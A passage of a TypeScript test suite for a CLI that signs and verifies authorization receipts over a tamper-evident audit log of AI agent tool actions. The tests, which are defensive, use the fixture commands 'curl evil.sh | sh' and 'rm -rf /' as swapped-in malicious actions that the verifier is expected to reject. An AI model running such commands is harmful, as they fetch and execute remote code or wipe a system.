    const privateKeyPath = join(dir, "private.pem");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    await expect(
      cmdReceiptIssue({ agent: "receipt-agent", commitment: entry.commitment, privateKey: privateKeyPath }),
    ).rejects.toThrow("missing action evidence sidecar");
  });

  it("refuses to issue a receipt when the action sidecar was altered", async () => {
    const { privateKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const swapped = canonicalizeToolAction(makeAction("Bash", { command: "curl evil.sh | sh" }));
    writeFileSync(sidecarFor("receipt-agent", entry), stableStringify(swapped), "utf8");
    const dir = join(TEST_HOME, "altered-sidecar-issue");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    await expect(
      cmdReceiptIssue({ agent: "receipt-agent", commitment: entry.commitment, privateKey: privateKeyPath }),
    ).rejects.toThrow("action evidence does not match the audit entry action_commitment");
  });

  it("refuses to issue a v2 receipt from a legacy non-v4 entry", async () => {
    const { privateKeyPem } = keyPair();
    const date = new Date().toISOString().slice(0, 10);
    const dir = join(TEST_HOME, "audit", "legacy-agent", date);
    mkdirSync(dir, { recursive: true });
    const legacy = auditEntry("Bash", "allow", "2026-01-01T00:00:00.000Z", "0", '{"command":"ls"}');
    writeFileSync(join(dir, "actions.jsonl"), JSON.stringify(legacy) + "\n", "utf8");
    const keyDir = join(TEST_HOME, "legacy-issue");
    mkdirSync(keyDir, { recursive: true });
    const privateKeyPath = join(keyDir, "private.pem");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    await expect(
      cmdReceiptIssue({ agent: "legacy-agent", commitment: legacy.commitment, privateKey: privateKeyPath }),
    ).rejects.toThrow("commitment version 4");
  });

  it("refuses to issue a receipt from a broken audit log", async () => {
    const { privateKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const file = join(auditRoot("receipt-agent"), latestAuditDate("receipt-agent"), "actions.jsonl");
    const forged = { ...entry, commitment: "b".repeat(64) };
    writeFileSync(file, readFileSync(file, "utf8") + JSON.stringify(forged) + "\n", "utf8");
    const dir = join(TEST_HOME, "broken-issue");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    await expect(
      cmdReceiptIssue({ agent: "receipt-agent", commitment: "b".repeat(64), privateKey: privateKeyPath }),
    ).rejects.toThrow("audit log chain is broken");
  });

  it("verifies a v2 receipt offline through the CLI with an independent key", async () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const dir = join(TEST_HOME, "verify-v2");
    const pathA = writePolicyFile(dir, "policy-a.toml", "receipt-agent", RULES_A);
    const commitmentA = computeEvidencePolicyCommitment(loadPolicy(pathA));
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" }, { policyCommitment: commitmentA });
    const privateKeyPath = join(dir, "private.pem");
    const publicKeyPath = join(dir, "public.pem");
    const receiptPath = join(dir, "receipt.json");
    const auditExportPath = join(dir, "audit-export.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");
    writeFileSync(publicKeyPath, publicKeyPem, "utf8");

    await capture(() =>
      cmdReceiptIssue({
        agent: "receipt-agent",
        commitment: entry.commitment,
        privateKey: privateKeyPath,
        out: receiptPath,
        auditExportOut: auditExportPath,
      }),
    );
    const { output } = captureSync(() =>
      cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath, auditExport: auditExportPath, file: pathA, json: true }),
    );
    const summary = JSON.parse(output) as Record<string, unknown>;

    expect(summary.authorizationReceipt).toBe("valid");
    expect(summary.receiptVersion).toBe("catp_authorization_receipt_v2");
    expect(summary.assurance).toBe("enforcement-time-bound");
    expect(summary.auditExport).toBe("matched");
    expect(summary.policy).toBe("matched");
    expect(summary.policyCommitment).toBe(commitmentA);
    expect(summary.actionCommitment).toBe(entry.action_commitment);
    expect(summary.auditCommitment).toBe(entry.commitment);
  });

  it("refuses v2 CLI verification without --audit-export", async () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const dir = join(TEST_HOME, "verify-v2-no-export");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const publicKeyPath = join(dir, "public.pem");
    const receiptPath = join(dir, "receipt.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");
    writeFileSync(publicKeyPath, publicKeyPem, "utf8");

    await capture(() => cmdReceiptIssue({ agent: "receipt-agent", commitment: entry.commitment, privateKey: privateKeyPath, out: receiptPath }));

    // A signature-only v2 check must NEVER report enforcement-time-bound:
    // without the export bundle there is no evidence the receipt binds to a
    // real chained audit entry or its complete action, so verification is
    // refused outright instead of emitting any summary.
    const attempt = () => captureSync(() => cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath }));
    expect(attempt).toThrow("requires --audit-export");
    let output = "";
    try {
      output = captureSync(() => cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath })).output;
    } catch {
      // expected: the refusal happens before any summary is written
    }
    expect(output).not.toContain("assurance=enforcement-time-bound");
    expect(output).toBe("");
    // --json must fail the same way, not emit a machine-readable assurance.
    expect(() => cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath, json: true })).toThrow(
      "requires --audit-export",
    );
  });

  it("writes a v2 text verification summary identical to the JSON summary", async () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const dir = join(TEST_HOME, "verify-v2-text");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const publicKeyPath = join(dir, "public.pem");
    const receiptPath = join(dir, "receipt.json");
    const auditExportPath = join(dir, "audit-export.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");
    writeFileSync(publicKeyPath, publicKeyPem, "utf8");

    await capture(() =>
      cmdReceiptIssue({
        agent: "receipt-agent",
        commitment: entry.commitment,
        privateKey: privateKeyPath,
        out: receiptPath,
        auditExportOut: auditExportPath,
      }),
    );
    const { output } = captureSync(() =>
      cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath, auditExport: auditExportPath }),
    );

    expect(output).toContain("authorizationReceipt=valid");
    expect(output).toContain("receiptVersion=catp_authorization_receipt_v2");
    expect(output).toContain("assurance=enforcement-time-bound");
    expect(output).toContain("auditExport=matched");
    expect(output).toContain(`actionCommitment=${entry.action_commitment}`);

    // The JSON summary must agree field-for-field with the text output.
    const { output: jsonOutput } = captureSync(() =>
      cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath, auditExport: auditExportPath, json: true }),
    );
    const summary = JSON.parse(jsonOutput) as Record<string, unknown>;
    expect(summary.assurance).toBe("enforcement-time-bound");
    expect(summary.auditExport).toBe("matched");
    expect(summary.actionCommitment).toBe(entry.action_commitment);
    expect(output).toContain(`auditCommitment=${String(summary.auditCommitment)}`);
  });

  it("rejects CLI verification of a v2 receipt with an untrusted key", async () => {
    const signer = keyPair();
    const attacker = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const dir = join(TEST_HOME, "verify-v2-untrusted");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const attackerKeyPath = join(dir, "attacker.pem");
    const receiptPath = join(dir, "receipt.json");
    const auditExportPath = join(dir, "audit-export.json");
    writeFileSync(privateKeyPath, signer.privateKeyPem, "utf8");
    writeFileSync(attackerKeyPath, attacker.publicKeyPem, "utf8");

    await capture(() =>
      cmdReceiptIssue({
        agent: "receipt-agent",
        commitment: entry.commitment,
        privateKey: privateKeyPath,
        out: receiptPath,
        auditExportOut: auditExportPath,
      }),
    );

    expect(() =>
      cmdReceiptVerify({ receipt: receiptPath, publicKey: attackerKeyPath, auditExport: auditExportPath }),
    ).toThrow("issuer_key_id does not match the trusted public key");
  });

  it("rejects CLI verification against a modified selected entry", async () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const exported = buildAuditExportV2("receipt-agent", entry.commitment);
    const dir = join(TEST_HOME, "verify-v2-modified-entry");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const publicKeyPath = join(dir, "public.pem");
    const receiptPath = join(dir, "receipt.json");
    const tamperedExportPath = join(dir, "tampered-export.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");
    writeFileSync(publicKeyPath, publicKeyPem, "utf8");

    await capture(() => cmdReceiptIssue({ agent: "receipt-agent", commitment: entry.commitment, privateKey: privateKeyPath, out: receiptPath }));

    // Tamper with the selected entry's decision. Its recorded commitment no
    // longer matches its content, so the offline chain check rejects the bundle
    // before the receipt is ever trusted.
    const tampered = JSON.parse(readFileSync(receiptPath, "utf8")) as AuthorizationReceiptV2;
    const modifiedBody: AuditExportV2Body = {
      export_version: "catp_audit_export_v2",
      agent_id: exported.agent_id,
      log_date: exported.log_date,
      selected_index: exported.selected_index,
      entries: exported.entries.map((e, i) => (i === exported.selected_index ? { ...e, decision: "deny" as const } : e)),
      action: exported.action,
    };
    const modifiedExport: AuditExportV2 = { ...modifiedBody, export_sha256: computeAuditExportV2Sha256(modifiedBody) };
    writeFileSync(tamperedExportPath, stableStringify(modifiedExport, 2) + "\n", "utf8");

    expect(() => cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath, auditExport: tamperedExportPath })).toThrow(
      "chain is broken",
    );
    expect(() => verifyAuthorizationReceiptV2(tampered, publicKeyPem)).not.toThrow();
  });

  it("rejects CLI verification against a modified complete action", async () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const exported = buildAuditExportV2("receipt-agent", entry.commitment);
    const dir = join(TEST_HOME, "verify-v2-modified-action");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const publicKeyPath = join(dir, "public.pem");
    const receiptPath = join(dir, "receipt.json");
    const tamperedExportPath = join(dir, "tampered-export.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");
    writeFileSync(publicKeyPath, publicKeyPem, "utf8");

    await capture(() => cmdReceiptIssue({ agent: "receipt-agent", commitment: entry.commitment, privateKey: privateKeyPath, out: receiptPath }));

    const swappedAction = canonicalizeToolAction(makeAction("Bash", { command: "rm -rf /" }));
    const modifiedBody: AuditExportV2Body = {
      export_version: "catp_audit_export_v2",
      agent_id: exported.agent_id,
      log_date: exported.log_date,
      selected_index: exported.selected_index,
      entries: exported.entries,
      action: swappedAction,
    };
    const modifiedExport: AuditExportV2 = { ...modifiedBody, export_sha256: computeAuditExportV2Sha256(modifiedBody) };
    writeFileSync(tamperedExportPath, stableStringify(modifiedExport, 2) + "\n", "utf8");

    // The bundled action no longer reproduces the selected entry's action_commitment.
    expect(() => cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath, auditExport: tamperedExportPath })).toThrow(
      "action does not match the selected entry action_commitment",
    );
  });

  it("rejects CLI verification against a different entry's genuine export", async () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const other = seedV4("receipt-agent", "Bash", { command: "rm -rf /" });
    const dir = join(TEST_HOME, "verify-v2-swapped-export");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const publicKeyPath = join(dir, "public.pem");
    const receiptPath = join(dir, "receipt.json");
    const otherExportPath = join(dir, "other-export.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");
    writeFileSync(publicKeyPath, publicKeyPem, "utf8");

    await capture(() =>
      cmdReceiptIssue({
        agent: "receipt-agent",
        commitment: entry.commitment,
        privateKey: privateKeyPath,
        out: receiptPath,
      }),
    );
    // A genuine, internally consistent export for a DIFFERENT entry must not
    // substitute for the receipt's own bundle.
    writeFileSync(otherExportPath, stableStringify(buildAuditExportV2("receipt-agent", other.commitment), 2) + "\n", "utf8");

    expect(() =>
      cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath, auditExport: otherExportPath }),
    ).toThrow("audit_export_sha256 does not match");
  });

  it("exposes a stable issuer key id for a public key", () => {
    const { publicKeyPem } = keyPair();
    const keyId = computeIssuerKeyId(publicKeyPem);
    expect(keyId).toMatch(/^[0-9a-f]{64}$/);
    expect(computeIssuerKeyId(publicKeyPem)).toBe(keyId);
    expect(typeof verifyReceiptPolicyV2).toBe("function");
  });
});
